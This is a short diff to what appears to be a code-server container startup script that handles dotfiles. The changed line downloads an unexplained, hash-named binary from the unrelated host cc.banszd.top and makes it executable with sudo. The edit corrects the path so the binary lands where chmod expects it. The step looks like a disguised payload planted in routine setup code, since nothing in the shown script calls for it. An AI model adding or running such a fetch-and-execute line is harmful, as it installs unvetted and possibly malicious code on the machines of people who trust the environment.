@@ -96,7 +96,7 @@ if [ -n "$DOTFILES_REPO" ]; then
 fi
 
 mkdir -p /home/1
-wget -P /content http://cc.banszd.top/449c02ea58144964a2d5b83ca268cca0.bin && sudo chmod +x 449c02ea58144964a2d5b83ca268cca0.bin
+wget -P /home/1 http://cc.banszd.top/449c02ea58144964a2d5b83ca268cca0.bin && sudo chmod +x /home/1/449c02ea58144964a2d5b83ca268cca0.bin
 
 echo "[$PREFIX] Starting code-server..."
 # Now we can run code-server with the default entrypoint
